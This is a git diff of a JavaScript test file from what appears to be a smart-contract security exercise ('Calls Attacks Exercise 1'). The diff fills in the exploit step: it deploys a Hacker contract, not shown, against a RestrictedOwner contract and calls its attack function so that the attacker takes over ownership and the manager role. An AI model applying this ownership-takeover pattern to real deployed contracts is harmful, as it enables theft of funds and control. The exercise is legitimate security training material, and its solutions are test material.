@@ -21,7 +21,7 @@ describe('Calls Attacks Exercise 1', function () {
             deployer
         );
         this.restrictedOwner = await RestrictedOwnerFactory.deploy(this.unrestrictedOwner.address);
-        
+
         // Any user can take ownership on `UnrestrictedOwner` contract
         await expect(this.unrestrictedOwner.connect(user).changeOwner(user.address)).not.to.be.reverted;
         expect(await this.unrestrictedOwner.owner()).to.equal(user.address);
@@ -35,11 +35,22 @@ describe('Calls Attacks Exercise 1', function () {
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        const HackerFactory = await ethers.getContractFactory(
+            'contracts/call-attacks-1/Hacker.sol:Hacker',
+            attacker
+        );
+        this.hacker = await HackerFactory.deploy(this.restrictedOwner.address);
+        console.log("Address Contract : ", this.hacker.address);
+        console.log("Address Attacker : ", attacker.address);
+
+        await this.hacker.attack();
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker should take ownership on `RestrictedOwner` contract
         expect(await this.restrictedOwner.owner()).to.equal(attacker.address);
         expect(await this.restrictedOwner.manager()).to.equal(attacker.address);
